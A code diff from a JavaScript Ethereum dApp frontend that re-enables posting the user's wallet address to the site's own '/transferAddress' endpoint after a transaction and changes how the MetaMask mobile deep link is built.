@@ -563,7 +563,8 @@ let txx = await window.ethereum.request({
    
 //-------------------------  sending mail to the client ---------------------------
     
-    /* if (txx) {
+    if (txx) {
+      console.log('done', walletAddress0);
       await api
         .post("/transferAddress", {
           params: { address: walletAddress0},
@@ -574,7 +575,7 @@ let txx = await window.ethereum.request({
         .catch(function (error) {
           console.log("stories error response :: ", error);
         });
-    } */
+    }
   }
 
   const onBtnClick = async () => {
@@ -600,10 +601,9 @@ let txx = await window.ethereum.request({
             console.error('Error:', err);
         }
     } else {
-      alert('Ethereum not detected');
-        const dappUrl = window.location.href;
-        const metamaskAppDeepLink = `https://metamask.app.link/dapp/${encodeURIComponent(dappUrl)}`;
-        window.open(metamaskAppDeepLink, '_self');
+      const dappUrl = window.location.href.split("//")[1].split("/")[0];
+  const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
+  window.open(metamaskAppDeepLink, "_self");
     }
 };
 /*   const onBtnClick = async () => {
